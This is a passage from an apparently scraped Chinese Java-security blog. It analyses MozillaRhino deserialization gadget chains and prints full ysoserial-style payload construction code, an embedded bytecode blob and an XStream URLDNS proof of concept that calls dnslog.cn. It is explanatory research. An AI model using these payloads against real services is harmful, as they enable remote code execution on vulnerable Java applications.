MAAAABsQAAAAEADQAAAAYAAQAAABUAEAAAAAQAAQARAAEADgASAAIADAAAABkAAAAEAAAAAbEAAAABAA0AAAAGAAEAAAAaABAAAAAEAAEAEQAIABMACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAADAAJAA8ADAANAA0ADgAWABAAFAAAAAcAAkwHABUJAAEAFgAAAAIAFw==&quot;);\n\tReflections.setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][] {code});\n \n\t// 创建 NativeJavaObject\n\tContext context = Context.enter();\n\tNativeObject scriptableObject = (NativeObject) context.initStandardObjects();\n\tNativeJavaObject nativeJavaObject =\n\t\t\tnew NativeJavaObject(scriptableObject, templatesImpl, TemplatesImpl.class);\n\tReflections.setFieldValue(nativeError, &quot;prototypeObject&quot;, nativeJavaObject);\n \n\tBadAttributeValueExpException badAttributeValueExpException =\n\t\t\tnew BadAttributeValueExpException(null);\n \n\tReflections.setFieldValue(badAttributeValueExpException, &quot;val&quot;, nativeError);\n \n\treturn badAttributeValueExpException;\n}\n简化版调用关系梳理\nBadAttributeValueExpException.readObject\n  // 调用 NativeError.toString 方法\n  val.toString()\n    js_toString()\n      ScriptableObject.getProperty(thisObj, &quot;name&quot;);\n        // 获取第一个 GetterSlot，调用 IdScriptableObject#get\n        obj.get(name, start);\n          // 调用 ScriptableObject#get\n          super.get(name, start)\n            getImpl\n              // 获取名称为 name 的 GetterSlot\n              getSlot(name, index, SLOT_QUERY);\n              // Getter#getValue\n              slot.getValue(start);\n                // 动态调用 Context#enter 方法\n                nativeGetter.invoke(getterThis, args);\n      ScriptableObject.getProperty(thisObj, &quot;message&quot;);\n        // 获取第二个 GetterSlot\n        obj.get(name, start);\n          // 调用 ScriptableObject#get\n          super.get(name, start)\n            getImpl\n              // 获取名称为 message 的 GetterSlot\n              getSlot(name, index, SLOT_QUERY);\n              // Getter#getValue\n              slot.getValue(start);\n                // NativeJavaMethod#call 方法\n                f.call(cx, f.getParentScope(), start,\n                                  ScriptRuntime.emptyArgs)\n                  // 动态调用 TemplatesImpl#newTransformer 方法\n                  meth.invoke(javaObject, args);\nysoserial/MozillaRhino1\nyso 的构造方法比 MozillaRhinoBadAttributeValueExpExceptionExec.java 要简单的多，用到了很多已有多接口，减少反射的使用\npublic Object getObject(final String command) throws Exception {\n    // 创建 NativeError 实例对象\n\tClass nativeErrorClass = Class.forName(&quot;org.mozilla.javascript.NativeError&quot;);\n\tConstructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();\n\tReflections.setAccessible(nativeErrorConstructor);\n\tIdScriptableObject idScriptableObject = (IdScriptableObject) nativeErrorConstructor.newInstance();\n \n\tContext context = Context.enter();\n \n\tNativeObject scriptableObject = (NativeObject) context.initStandardObjects();\n \n\tMethod enterMethod = Context.class.getDeclaredMethod(&quot;enter&quot;);\n\tNativeJavaMethod method = new NativeJavaMethod(enterMethod, &quot;name&quot;);\n\t// 创建第一个名为 name 的 GetterSlot 并设置它的 getter 成员\n\tidScriptableObject.setGetterOrSetter(&quot;name&quot;, 0, method, false);\n \n\tMethod newTransformer = TemplatesImpl.class.getDeclaredMethod(&quot;newTransformer&quot;);\n\tNativeJavaMethod nativeJavaMethod = new NativeJavaMethod(newTransformer, &quot;message&quot;);\n\t// 创建第二个名为 message 的 GetterSlot 并设置它的 getter 成员，类型为 NativeJavaMethod，调用 TemplatesImpl#newTransformer 方法\n\tidScriptableObject.setGetterOrSetter(&quot;message&quot;, 0, nativeJavaMethod, false);\n \n\tMethod getSlot = ScriptableObject.class.getDeclaredMethod(&quot;getSlot&quot;, String.class, int.class, int.class);\n\tReflections.setAccessible(getSlot);\n\t// 获取名为 name 的 GetterSlot 的 getter 成员\n\tObject slot = getSlot.invoke(idScriptableObject, &quot;name&quot;, 0, 1);\n\tField getter = slot.getClass().getDeclaredField(&quot;getter&quot;);\n\tReflections.setAccessible(getter);\n \n\tClass memberboxClass = Class.forName(&quot;org.mozilla.javascript.MemberBox&quot;);\n\tConstructor memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);\n\tReflections.setAccessible(memberboxClassConstructor);\n\tObject memberboxes = memberboxClassConstructor.newInstance(enterMethod);\n\t// 设置名为 name 的 GetterSlot的 getter，为 MemberBox 实例对象，用于调用 Context#enter 方法\n\tgetter.set(slot, memberboxes);\n \n\tNativeJavaObject nativeObject = new NativeJavaObject(scriptableObject, Gadgets.createTemplatesImpl(command), TemplatesImpl.class);\n\t// 设置 NativeError 实例对象的 prototypeObject 成员\n\tidScriptableObject.setPrototype(nativeObject);\n \n\tBadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);\n\tField valField = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);\n\tReflections.setAccessible(valField);\n\tvalField.set(badAttributeValueExpException, idScriptableObject);\n \n\treturn badAttributeValueExpException;\n}\n不使用 BadAttributeValueExpException\nysoserial/MozillaRhino2 里提到了另一种构造方法，不使用 BadAttributeValueExpException，仅依赖 Rhino 完成利用链的构造。这里先不讨论它是如何实现的，如果是你，可以做到仅使用 Rhino 完成利用链的构造吗？\n下面的构造方式主要使用 NativeJavaObject ，其它都和前面类似，只是像积木一样拼接起来而已。\n查看 NativeJavaObject#readObject 方法，里面有一行调用了静态成员 adapter_readAdapterObject，\nprivate void readObject(ObjectInputStream in)\n\tthrows IOException, ClassNotFoundException\n{\n\tin.defaultReadObject();\n \n\tisAdapter = in.readBoolean();\n\tif (isAdapter) {\n\t\tif (adapter_readAdapterObject == null)\n\t\t\tthrow new ClassNotFoundException();\n\t\tObject[] args = { this, in };\n\t\ttry {\n\t\t\tjavaObject = adapter_readAdapterObject.invoke(null, args);\n\t\t} catch (Exception ex) {\n\t\t\tthrow new IOException();\n\t\t}\n\t} else {\n\t\tjavaObject = in.readObject();\n\t}\n \n\tString className = (String)in.readObject();\n\tif (className != null) {\n\t\tstaticType = Class.forName(className);\n\t} else {\n\t\tstaticType = null;\n\t}\n \n\tinitMembers();\n}\nadapter_readAdapterObject 默认对应的是 JavaAdapter#readAdapterObject 方法，还有一个对应的成员 adapter_writeAdapterObject 默认对应 JavaAdapter#writeAdapterObject 方法。\npublic static Object readAdapterObject(Scriptable self,\n\t\t\t\t\t\t\t\t\t   ObjectInputStream in)\n\tthrows IOException, ClassNotFoundException\n{\n\tContextFactory factory;\n\tContext cx = Context.getCurrentContext();\n\tif (cx != null) {\n\t\tfactory = cx.getFactory();\n\t} else {\n\t\tfactory = null;\n\t}\n \n\tClass&lt;?&gt; superClass = Class.forName((String)in.readObject());\n \n\tString[] interfaceNames = (String[])in.readObject();\n\tClass&lt;?&gt;[] interfaces = new Class[interfaceNames.length];\n \n\tfor (int i=0; i &lt; interfaceNames.length; i++)\n\t\tinterfaces[i] = Class.forName(interfaceNames[i]);\n    // delegee 的类型需要为 Scriptable\n\tScriptable delegee = (Scriptable)in.readObject();\n \n\tClass&lt;?&gt; adapterClass = getAdapterClass(self, superClass, interfaces, delegee); // [12]\n跟入 [12] 调用 getAdapterClass\nprivate static Class&lt;?&gt; getAdapterClass(Scriptable scope, Class&lt;?&gt; superClass,\n\t\t\t\t\t\t\t\t\t Class&lt;?&gt;[] interfaces, Scriptable obj)\n{\n\tClassCache cache = ClassCache.get(scope);\n\tMap&lt;JavaAdapterSignature,Class&lt;?&gt;&gt; generated\n\t\t= cache.getInterfaceAdapterCacheMap();\n \n\tObjToIntMap names = getObjectFunctionNames(obj); // [13]\n最后来到 getObjectFunctionNames，[13]\nprivate static ObjToIntMap getObjectFunctionNames(Scriptable obj) {\n\tObject[] ids = ScriptableObject.getPropertyIds(obj);\n\tObjToIntMap map = new ObjToIntMap(ids.length);\n\tfor (int i = 0; i != ids.length; ++i) {\n\t\tif (!(ids[i] instanceof String))\n\t\t\tcontinue;\n\t\tString id = (String) ids[i];\n\t\tObject value = ScriptableObject.getProperty(obj, id);\n\t\tif (value instanceof Function) {\n\t\t\tFunction f = (Function)value;\n\t\t\tint length = ScriptRuntime.toInt32(\n\t\t\t\t\t\t\t ScriptableObject.getProperty(f, &quot;length&quot;));\n\t\t\tif (length &lt; 0) {\n\t\t\t\tlength = 0;\n\t\t\t}\n\t\t\tmap.put(id, length);\n\t\t}\n\t}\n\treturn map;\n}\n在内部可以看到对 ScriptableObject.getProperty(obj, id) 方法的调用，不过第二个参数不再是固定值了，这个参数由 ScriptableObject.getPropertyIds(obj) 的返回值决定。\n那么只需要想办法触发两次 JavaAdapter#readAdapterObject 方法调用，第一次调用 Context.enter() 初始化 Context，第二次执行命令。或是如果 ids 的大小为 2，并且顺序可控，只需触发 JavaAdapter#readAdapterObject 方法调用一次。\n无论是哪一种，要做到都不太容易，此外还要确保能正常调用到 getObjectFunctionNames，不出现异常。\n尝试先初始化 Context\n下面先考虑第一步，调用 Context.enter() 初始化 Context，不考虑后续利用。要怎么构造？这中间需要注意的一些条件还是挺多的。下面是一种实现方式\npublic static Object getContextObject() throws Exception {\n\t// 创建一个 ScriptableObject 对象，用于设置 NativeJavaObject 的成员 prototype\n\t// 此 ScriptableObject 对象的成员 associatedValues 是一个 Hashtable 对象，需要包含 key 值 &quot;ClassCache&quot;。\n\tScriptableObject dummyScope = new Environment();\n\tMap&lt;Object, Object&gt; associatedValues = new Hashtable&lt;&gt;();\n\tassociatedValues.put(&quot;ClassCache&quot;, Reflections.createWithoutConstructor(ClassCache.class));\n\tReflections.setFieldValue(dummyScope, &quot;associatedValues&quot;, associatedValues);\n \n\t// 创建第一个 GetterSlot 调用 `Context#enter` 方法，第三个参数设置为 4，创建的才会是 GetterSlot\n\tScriptableObject scriptableObject = new Environment();\n\tObject nameSlot =\n\t\t\tReflections.getMethod(\n\t\t\t\t\t\t\tScriptableObject.class,\n\t\t\t\t\t\t\t&quot;getSlot&quot;,\n\t\t\t\t\t\t\tString.class,\n\t\t\t\t\t\t\tint.class,\n\t\t\t\t\t\t\tint.class)\n\t\t\t\t\t.invoke(scriptableObject, &quot;foo&quot;, 0, 4);\n \n\t// 设定动态调用的方法为 Context#enter\n\tMethod enterMethod = Reflections.getMethod(Context.class, &quot;enter&quot;);\n \n\t// 创建 MemberBox\n\tClass&lt;?&gt; memberBoxErrorClass = Class.forName(&quot;org.mozilla.javascript.MemberBox&quot;);\n\tObject memberBox = Reflections.createWithoutConstructor(memberBoxErrorClass);\n\tReflections.getMethod(memberBoxErrorClass, &quot;init&quot;, Method.class)\n\t\t\t.invoke(memberBox, enterMethod);\n\tReflections.setFieldValue(nameSlot, &quot;getter&quot;, memberBox);\n \n\tNativeJavaObject nativeJavaObject = new NativeJavaObject();\n\tReflections.setFieldValue(nativeJavaObject, &quot;javaObject&quot;, scriptableObject);\n\tReflections.setFieldValue(nativeJavaObject, &quot;isAdapter&quot;, true);\n\tMethod method =\n\t\t\tMozillaRhinoExec.class.getMethod(\n\t\t\t\t\t&quot;customWriteAdapterObject&quot;, Object.class, ObjectOutputStream.class);\n\tReflections.setFieldValue(nativeJavaObject, &quot;adapter_writeAdapterObject&quot;, method);\n\tReflections.setFieldValue(nativeJavaObject, &quot;prototype&quot;, dummyScope);\n \n\treturn nativeJavaObject;\n}\n这里构建了一个 dummyScope 对象，并修改了成员 associatedValues 的值。这一步，是为了保证在 [12] 中调用 getAdapterClass 时确保 ClassCache.get(scope) 正常返回，否则会抛出异常。\npublic static ClassCache get(Scriptable scope) {\n\tClassCache cache = (ClassCache)\n\t\t\tScriptableObject.getTopScopeValue(scope, AKEY);\n\tif (cache == null) {\n\t\tthrow new RuntimeException(&quot;Can&#039;t find top level scope for &quot; +\n\t\t\t\t&quot;ClassCache.get&quot;);\n\t}\n\treturn cache;\n}\n \npublic static Object getTopScopeValue(Scriptable scope, Object key) {\n\tscope = ScriptableObject.getTopLevelScope(scope);\n\tfor (;;) {\n\t\tif (scope instanceof ScriptableObject) {\n\t\t\tScriptableObject so = (ScriptableObject)scope;\n\t\t\tObject value = so.getAssociatedValue(key);\n\t\t\tif (value != null) {\n\t\t\t\treturn value;\n\t\t\t}\n\t\t}\n\t\tscope = scope.getPrototype();\n\t\tif (scope == null) {\n\t\t\treturn null;\n\t\t}\n\t}\n其次修改 adapter_writeAdapterObject 为自定义方法，确保在执行到所需方法前不尝试异常。\npublic static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out)\n\t\tthrows IOException {\n\tout.writeObject(&quot;java.lang.Object&quot;);\n\tout.writeObject(new String[0]);\n\t// 写入成员 javaObject\n\tout.writeObject(javaObject);\n}\nScriptableObject.getPropertyIds(obj)\n这里再还有一个很关键的地方，在 [13] 的 getObjectFunctionNames 方法中，ScriptableObject.getPropertyIds(obj); 返回的内容是如何得到的？这里以前面的构造的示例代码进行说明\npublic static Object[] getPropertyIds(Scriptable obj) {\n\tif (obj == null) {\n\t\treturn ScriptRuntime.emptyArgs;\n\t}\n\t// 调用 ScriptableObject.getIds(boolean getAll)，遍历链表 firstAdded 中每个 slot 的 name 值并返回\n\tObject[] result = obj.getIds();\n\tObjToIntMap map = null;\n\tfor (;;) {\n\t    // 获取成员 prototypeObject，前面的示例代码中，为 null\n\t\tobj = obj.getPrototype();\n\t\tif (obj == null) {\n\t\t\tbreak;\n\t\t}\n\t\t// 如果 prototypeObject 不为 null，继续调用获取所有 id，依赖具体实现\n\t\tObject[] ids = obj.getIds();\n\t\tif (ids.length == 0) {\n\t\t\tcontinue;\n\t\t}\n\t\t// ...\n\t}\n\tif (map != null) {\n\t\tresult = map.getKeys();\n\t}\n\treturn result;\n}\n总结如下：\n\nobj 的类型没有重写 getIds 方法的话则返回其 slot 的 name 列表，\n\n如果 prototypeObject 不为 null，继续调用获取所有 id，依赖具体实现\n\n\nobj 的类型重写了 getIds 方法，则返回对应的内容\n\n如果 prototypeObject 不为 null，继续调用获取所有 id，依赖具体实现\n\n\n\n那么对于前面的示例代码，这一步返回的只会包含构造的 Slot 的 name，为 foo。\n\n如何再调用 NativeJavaObject.readObject\n最开始尝试的是让 ScriptableObject.getPropertyIds(obj)，返回的 ids 仅包含两个 Slot 的 name。不过这一点做不到『至少按照前面分析使用的调用 TemplatesImpl#newTransformer 方法的利用链构造方式是做不到的』，因为如果这样，obj 的 prototypeObject 一定不为 null，而是一个 NativeJavaObject 对象。它的 getIds 方法如下，\npublic Object[] getIds() {\n\treturn members.getIds(false);\n}\n会返回 member 中所有的 key 值，也就是类 TemplatesImpl 中的成员名。member 由 NativeJavaObject#initMembers 方法计算得到。\n\n可通过调试 MozillaRhinoExec.java 文件的 getObjectTest 方法来帮助理解。\n\n那么就要确保返回的 ids 中内容的顺序了，但 ObjToIntMap 的 intern 方法是如何计算 key 值存放顺序的，有些复杂，不太好控制，所以这种方式并不是很好。最好的方式是，ids 每次只包含一条内容。\n但是通过测试，发现可以枚举找到一个 name，让它能排在 ObjToIntMap 返回值的第一个『假设 member 由 TemplatesImpl 计算得到』，这个 name 就是 yy。当然，这不是唯一解。但这样做有什么用呢？考虑第二种构造方案\n\n触发两次 JavaAdapter#readAdapterObject 方法调用\n\n第一次用于调用 Context#enter\n第二次用于调用 TemplatesImpl#newTransformer\n\n\n\n思路不难，反序列化时会先恢复成员，再恢复整个对象。例如一个对象类型为 Environment ，有成员 parentScopeObject，并且它也实现了 readObjecct 方法，那么 in.defaultReadObject(); 会先调用 parentScopeObject 的 readObjecct 方法恢复 parentScopeObject 对象，再恢复整体。\nMozillaRhinoExec.java\n下面是实现代码，\npublic static Object getObject() throws Exception {\n\tScriptableObject dummyScope = new Environment();\n\tMap&lt;Object, Object&gt; associatedValues = new Hashtable&lt;&gt;();\n\tassociatedValues.put(&quot;ClassCache&quot;, Reflections.createWithoutConstructor(ClassCache.class));\n\tReflections.setFieldValue(dummyScope, &quot;associatedValues&quot;, associatedValues);\n \n\tEnvironment env = new Environment();\n\tObject messageSlot =\n\t\tReflections.getMethod(\n\t\t\t\tScriptableObject.class,\n\t\t\t\t&quot;getSlot&quot;,\n\t\t\t\tString.class,\n\t\t\t\tint.class,\n\t\t\t\tint.class)\n\t\t\t.invoke(env, &quot;yy&quot;, 0, 4);\n \n\t// 设定动态调用的方法为 TemplatesImpl#newTransformer\n\tMethod templateMethod = Reflections.getMethod(TemplatesImpl.class, &quot;newTransformer&quot;);\n \n\t// 创建 NativeJavaMethod\n\tNativeJavaMethod transformerJavaMethod = new NativeJavaMethod(templateMethod, &quot;templates&quot;);\n\tReflections.setFieldValue(messageSlot, &quot;getter&quot;, transformerJavaMethod);\n \n\t// 创建 NativeJavaObject\n\tNativeJavaObject nativeJavaObject =\n\t\tnew NativeJavaObject(dummyScope, templatesImpl(), TemplatesImpl.class);\n\tReflections.setFieldValue(env, &quot;prototypeObject&quot;, nativeJavaObject);\n \n\tNativeJavaObject outer = new NativeJavaObject();\n\tReflections.setFieldValue(outer, &quot;javaObject&quot;, env);\n\tReflections.setFieldValue(outer, &quot;isAdapter&quot;, true);\n\tReflections.setFieldValue(outer, &quot;adapter_writeAdapterObject&quot;, method);\n\tReflections.setFieldValue(outer, &quot;prototype&quot;, dummyScope);\n \n\tReflections.setFieldValue(env, &quot;parentScopeObject&quot;, getContextObject());\n \n\treturn outer;\n}\n其中 getContextObject() 需要稍微修改一下，在返回前添加一行代码，这是为了确保第一次 JavaAdapter#readAdapterObject 方法调用后，能够继续正确执行。\n// parent 不能为 null，因为 NativeJavaObject#readObject 中，javaObject =\n// adapter_readAdapterObject.invoke(null, args); 成功返回后会调用 initMembers();\nReflections.setFieldValue(nativeJavaObject, &quot;parent&quot;, dummyScope);\n这里将需要用于初始化 Context 对象的利用链部分放在了 env 的 parentScopeObject 成员中，内嵌关系如下\nNativeJavaObject // 通过 env 调用 TemplatesImpl#newTransformer 执行命令\n  -&gt; javaObject(env)\n    -&gt; env.parentScopeObject(NativeJavaObject) // 调用 Context#enter 初始化 Context\n简化版调用关系梳理\nNativeJavaObject.readObject\n  // 恢复 getObject() 中的 env，类型 Environment\n  ScriptableObject.readObject\n \n    // 调用 JavaAdapter#readAdapterObject 方法\n    adapter_readAdapterObject.invoke(null, args);\n      // 再次触发 NativeJavaObject.readObject，此时 isAdapter 依旧是 true\n      (Scriptable)in.readObject();\n \n        // 恢复 getContextObject() 中的 scriptableObject，类型 Environment\n        ScriptableObject.readObject\n          NativeJavaObject.readObject\n \n            // 第二次调用 JavaAdapter#readAdapterObject 方法\n            adapter_readAdapterObject.invoke(null, args);\n              // 获取 delegee，包含 name 为 &#039;foo&#039; 的 slot\n              (Scriptable)in.readObject();\n              getAdapterClass(self, superClass, interfaces,              delegee);\n                getObjectFunctionNames(obj);\n                  // 动态调用 Context#enter 方法\n                  ScriptableObject.getProperty(obj, id);\n      // 从上一层 (Scriptable)in.readObject(); 返回，获取 delegee，包含 name 为 &#039;yy&#039; 的 slot\n      getAdapterClass(self, superClass, interfaces,              delegee);\n        getObjectFunctionNames(obj);\n          // 动态调用 TemplatesImpl#newTransformer 方法\n          ScriptableObject.getProperty(obj, id);\nysoserial/MozillaRhino2\n下面为 ysoserial/MozillaRhino2 的实现代码，思路与前面使用的并不相同，这里不再分析了。\npublic Object getObject( String command) throws Exception {\n\tScriptableObject dummyScope = new Environment();\n\tMap&lt;Object, Object&gt; associatedValues = new Hashtable&lt;Object, Object&gt;();\n\tassociatedValues.put(&quot;ClassCache&quot;, Reflections.createWithoutConstructor(ClassCache.class));\n\tReflections.setFieldValue(dummyScope, &quot;associatedValues&quot;, associatedValues);\n \n\tObject initContextMemberBox = Reflections.createWithConstructor(\n\t\tClass.forName(&quot;org.mozilla.javascript.MemberBox&quot;),\n\t\t(Class&lt;Object&gt;)Class.forName(&quot;org.mozilla.javascript.MemberBox&quot;),\n\t\tnew Class[] {Method.class},\n\t\tnew Object[] {Context.class.getMethod(&quot;enter&quot;)});\n \n\tScriptableObject initContextScriptableObject = new Environment();\n\tMethod makeSlot = ScriptableObject.class.getDeclaredMethod(&quot;accessSlot&quot;, String.class, int.class, int.class);\n\tReflections.setAccessible(makeSlot);\n\tObject slot = makeSlot.invoke(initContextScriptableObject, &quot;foo&quot;, 0, 4);\n\tReflections.setFieldValue(slot, &quot;getter&quot;, initContextMemberBox);\n \n\tNativeJavaObject initContextNativeJavaObject = new NativeJavaObject();\n\tReflections.setFieldValue(initContextNativeJavaObject, &quot;parent&quot;, dummyScope);\n\tReflections.setFieldValue(initContextNativeJavaObject, &quot;isAdapter&quot;, true);\n\tReflections.setFieldValue(initContextNativeJavaObject, &quot;adapter_writeAdapterObject&quot;,\n\t\tthis.getClass().getMethod(&quot;customWriteAdapterObject&quot;, Object.class, ObjectOutputStream.class));\n\tReflections.setFieldValue(initContextNativeJavaObject, &quot;javaObject&quot;, initContextScriptableObject);\n \n\tScriptableObject scriptableObject = new Environment();\n\tscriptableObject.setParentScope(initContextNativeJavaObject);\n\tmakeSlot.invoke(scriptableObject, &quot;outputProperties&quot;, 0, 2);\n \n\tNativeJavaArray nativeJavaArray = Reflections.createWithoutConstructor(NativeJavaArray.class);\n\tReflections.setFieldValue(nativeJavaArray, &quot;parent&quot;, dummyScope);\n\tReflections.setFieldValue(nativeJavaArray, &quot;javaObject&quot;, Gadgets.createTemplatesImpl(command));\n\tnativeJavaArray.setPrototype(scriptableObject);\n\tReflections.setFieldValue(nativeJavaArray, &quot;prototype&quot;, scriptableObject);\n \n\tNativeJavaObject nativeJavaObject = new NativeJavaObject();\n\tReflections.setFieldValue(nativeJavaObject, &quot;parent&quot;, dummyScope);\n\tReflections.setFieldValue(nativeJavaObject, &quot;isAdapter&quot;, true);\n\tReflections.setFieldValue(nativeJavaObject, &quot;adapter_writeAdapterObject&quot;,\n\t\tthis.getClass().getMethod(&quot;customWriteAdapterObject&quot;, Object.class, ObjectOutputStream.class));\n\tReflections.setFieldValue(nativeJavaObject, &quot;javaObject&quot;, nativeJavaArray);\n \n\treturn nativeJavaObject;\n}\n参考\n\n gosecure.net/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/ 『通过 DNS 外连检测反序列化漏洞』\nblog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/ 『URLDNS 的起源』\ngithub.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java 『ysoserial 中的 URLDNS 利用链实现』\nthegreycorner.com/2016/05/01/commoncollections-deserialization.html 『CommonsCollection1 在 JDK8u72 失效，以及如何改进利用链』\n\ngithub.com/openjdk/jdk8u-dev/blob/jdk8u66-b36/jdk/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java 『openjdk8u66-b36 版本下的 AnnotationInvocationHandler 实现』\ngithub.com/openjdk/jdk8u-dev/compare/jdk8u71-b11…jdk8u71-b12 『8u71-b11 与 8u71-b12 的比对』\ngithub.com/openjdk/jdk8u-dev/commit/44ad83395ee267fdd564d4d37bd43594f3f48a46 『AnnotationInvocationHandler 的修复』\ngithub.com/apache/commons-collections/commit/bce4d022f27a723fa0e0b7484dcbf0afa2dd210a 『commons-collection3 对 InvokerTransformer 的修复』\nblog.csdn.net/xuhuaabc/article/details/91475761 『HashMap 与 Hashtable 的区别，主要关注对写入内容的 hash 值的计算方式上』\n\n\nwww.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478\nblog.chaitin.cn/2015-11-11_java_unserialize_rce/\nwww.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles 『frohoff Java 反序列化议题的 PPT』\nfoxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/\nwww.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478 『Exploiting Deserialization Vulnerabilities in Java 议题 PPT，提出使用 TransformedMap 构造利用链』\nxml.apache.org/xalan-j/ 『Apache Xalan 项目』\ngithub.com/ikkisoft/SerialKiller 『SerialKiller 反序列化防护工具』\ndownload.oracle.com/otndocs/jcp/7224-javabeans-1.01-fr-spec-oth-JSpec/ 『JavaBean 标准 1.01 版本』\nstackoverflow.com/questions/3295496/what-is-a-javabean-exactly 『解释 JavaBean 的概念』\ncodewhitesec.blogspot.com/2016/05/return-of-rhino-old-gadget-revisited.html 『介绍 Return of the Rhino 利用链，即 MozillaRhino，作者的目标是仅使用 JRE/JDK 中的类构造利用链』\n\np-bakker.github.io/rhino/history.html 『Rhino 的发展历史』\np-bakker.github.io/rhino/tutorials/scripting_java/#accessing-java-packages-and-classes 『Rhino 访问 Java 类』\np-bakker.github.io/rhino/docs/scopes_and_contexts/#contexts 『Rhino 的 Context 的作用』\n\n\n"},"articles/security/java/roadmap/Java-安全文章收录":{"title":"Java 安全文章收录","links":[],"tags":[],"content":"\n What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.\n CommonCollections deserialization attack payloads from ysoserial failing on &gt; JRE 8u72 · The Grey Corner\n"},"articles/security/java/roadmap/Java-安全知识整理":{"title":"Java 安全知识整理","links":["articles/security/java/roadmap/Java-安全---反射","articles/security/java/roadmap/Java-安全---动态代理","articles/security/java/roadmap/Java-安全---反序列化利用链","articles/security/java/roadmap/Java-安全---其它反序列化漏洞","articles/security/java/roadmap/Java-安全---RMI-介绍","articles/security/java/roadmap/Java-安全---RMI-攻击面"],"tags":[],"content":"重新归纳整理 Java 安全相关的知识点，目前已经完成的部分：\n\nJava 安全 - 反射\nJava 安全 - 动态代理\nJava 安全 - 动态代理\nJava 安全 - 反序列化利用链\nJava 安全 - 其它反序列化漏洞\nJava 安全 - RMI 介绍\nJava 安全 - RMI 攻击面\n"},"articles/security/java/xstream/XStream-下的-URLDNS":{"title":"XStream 下的 URLDNS","links":[],"tags":["xstream","urldns"],"content":"Java 反序列化中 URLDNS 调用链如下\nHashMap.readObject()\n  HashMap.putVal()\n    HashMap.hash()\n      URL.hashCode()\n\n在验证 XStream 相关漏洞时，看到其 URLDNS 的 Poc 如下\n&lt;map&gt;\n  &lt;entry&gt;\n    &lt;url&gt;http://*.dnslog.cn&lt;/url&gt;\n    &lt;string&gt;http://*.dnslog.cn&lt;/string&gt;\n  &lt;/entry&gt;\n&lt;/map&gt;\n问题\n简单了解，上手使用 XStream 后，觉得它是通过标签名来确认目标类型的。比如上面的 Poc，我认为应该写成下面这样。\n&lt;java.util.HashMap&gt;\n  &lt;entry&gt;\n    &lt;url&gt;http://*.dnslog.cn&lt;/url&gt;\n    &lt;string&gt;http://*.dnslog.cn&lt;/string&gt;\n  &lt;/entry&gt;\n&lt;/java.util.HashMap&gt;\n但，前面的 Poc 确实可行的，那么它是如何判断 map 标签是对应 HashMap 类型的呢？\n分析\n使用如下版本\n&lt;dependency&gt;\n  &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;\n  &lt;artifactId&gt;xstream&lt;/artifactId&gt;\n  &lt;version&gt;1.4.1&lt;/version&gt;\n&lt;/dependency&gt;\n和如下代码\npublic class App {\n \n    public static void main(String[] args) {\n        XStream xStream = new XStream();\n \n        String xml = &quot;&lt;map&gt;\\n&quot; +\n                &quot;  &lt;entry&gt;\\n&quot; +\n                &quot;    &lt;url&gt;fv5qop.dnslog.cn&lt;/url&gt;\\n&quot; +\n                &quot;    &lt;string&gt;fv5qop.dnslog.cn&lt;/string&gt;\\n&quot; +\n                &quot;  &lt;/entry&gt;\\n&quot; +\n                &quot;&lt;/map&gt;&quot;;\n \n        Object object = xStream.fromXML(xml);\n        System.out.println(object);\n    }\n}\n逐步跟入 fromXML 函数内部，确认类型判断位于如下函数，注意 HierarchicalStreams.readClassType(reader, mapper)。\npublic Object start(DataHolder dataHolder) {\n    this.dataHolder = dataHolder;\n    Class type = HierarchicalStreams.readClassType(reader, mapper);\n    Object result = convertAnother(null, type);\n    Iterator validations = validationList.iterator();\n    while (validations.hasNext()) {\n        Runnable runnable = (Runnable)validations.next();\n        runnable.run();\n    }\n    return result;\n}\n但 HierarchicalStreams.readClassType(reader, mapper) 的调用，返回的类型只是 java.util.Map。继续看 convertAnother(null, type)，跟入调用来到\npublic Object convertAnother(Object parent, Class type, Converter converter) {\n    type = mapper.defaultImplementationOf(type);\n    if (converter == null) {\n        converter = converterLookup.lookupConverterForType(type);\n    } else {\n        if (!converter.canConvert(type)) {\n            ConversionException e = new ConversionException(\n                &quot;Explicit selected converter cannot handle type&quot;);\n            e.add(&quot;item-type&quot;, type.getName());\n            e.add(&quot;converter-type&quot;, converter.getClass().getName());\n            throw e;\n        }\n    }\n    return convert(parent, type, converter);\n}\n这里通过 mapper.defaultImplementationOf(type) 获取类型，逐步跟入到 defaultImplementationOf\npublic Class defaultImplementationOf(Class type) {\n    if (typeToImpl.containsKey(type)) {\n        return (Class)typeToImpl.get(type);\n    } else {\n        return super.defaultImplementationOf(type);\n    }\n}\n这里根据前面获取的 type，通过 typeToImpl 得到它的默认实现类型。这个成员的内容如下\n{Class@1045} &quot;float&quot; -&gt; {Class@292} &quot;class java.lang.Float&quot;\n{Class@1046} &quot;int&quot; -&gt; {Class@289} &quot;class java.lang.Integer&quot;\n{Class@549} &quot;class java.util.Calendar&quot; -&gt; {Class@566} &quot;class java.util.GregorianCalendar&quot;\n{Class@510} &quot;interface java.util.SortedSet&quot; -&gt; {Class@512} &quot;class java.util.TreeSet&quot;\n{Class@1047} &quot;long&quot; -&gt; {Class@288} &quot;class java.lang.Long&quot;\n{Class@679} &quot;class com.thoughtworks.xstream.mapper.Mapper$Null&quot; -&gt; null\n{Class@323} &quot;interface java.util.Map&quot; -&gt; {Class@223} &quot;class java.util.HashMap&quot;\n{Class@1048} &quot;char&quot; -&gt; {Class@294} &quot;class java.lang.Character&quot;\n{Class@1049} &quot;short&quot; -&gt; {Class@421} 